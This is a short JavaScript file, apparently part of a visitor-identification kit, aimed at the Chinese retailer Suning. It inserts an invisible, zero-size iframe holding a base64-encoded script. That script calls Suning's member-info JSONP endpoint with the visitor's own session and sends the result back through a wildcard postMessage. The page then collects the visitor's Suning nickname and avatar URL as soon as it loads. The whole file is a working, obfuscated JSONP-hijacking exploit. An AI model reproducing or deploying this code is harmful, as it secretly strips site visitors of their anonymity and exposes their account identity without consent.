// 个人主页  用户名   用户id

function formateSuningyigouData(e) {
  if ('suning' === e.data.source) {
    let data = {
      userName: e.data.d.code.nickName,
      photo:
        'https://image2.suning.cn/uimg/cmf/cust_headpic/' +
        e.data.d.code.sysHeadPicNum,
    }
    let innerHTML = `
    <div class='item'>
      <p class='title'>苏宁易购</p>
      <p>用户名: ${e.data.d.code.nickName}</p>
      <p>图像：https://image2.suning.cn/uimg/cmf/cust_headpic/${e.data.d.code.sysHeadPicNum}</p>
    </div>
  `
    if (data.userName) {
      getInifoData({ type: 'suningyigou', data: data, html: innerHTML })
    }
  }
}
function suningyigou() {
  var d = document.createElement('iframe')
  d.src =
    'data:text/html;base64,PHNjcmlwdD4KCXdpbmRvdy5nZXRNeU1lbWJlckluZm9DYj0gZnVuY3Rpb24oZSwgdXNlcm5hbWUpIHsKbGV0IGQgPSB7c291cmNlOiAnc3VuaW5nJywgZDoge2NvZGU6IGUsIHVzZXJuYW1lOiB1c2VybmFtZX19O3dpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoZCAsICIqIik7fQoJbGV0IHMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKCXMuc3JjID0gImh0dHBzOi8vbXkuc3VuaW5nLmNvbS9iMmNCcm9hZHNpZGUvbWVtYmVySW5mb1BhZ2VIZWFkQjJjLmRvP2NhbGxiYWNrPWdldE15TWVtYmVySW5mb0NiJl89MTU5MTY4NzE1NTYzMCI7Cglkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuYXBwZW5kQ2hpbGQocyk7Cjwvc2NyaXB0Pg=='
  d.width = 0
  d.height = 0
  d.style.borderWidth = 0
  d.referrerPolicy = 'no-referrer'
  document.documentElement.appendChild(d)
}
window.addEventListener('message', formateSuningyigouData, !1)
// window.addEventListener('load', function () {
suningyigou()
// })
//
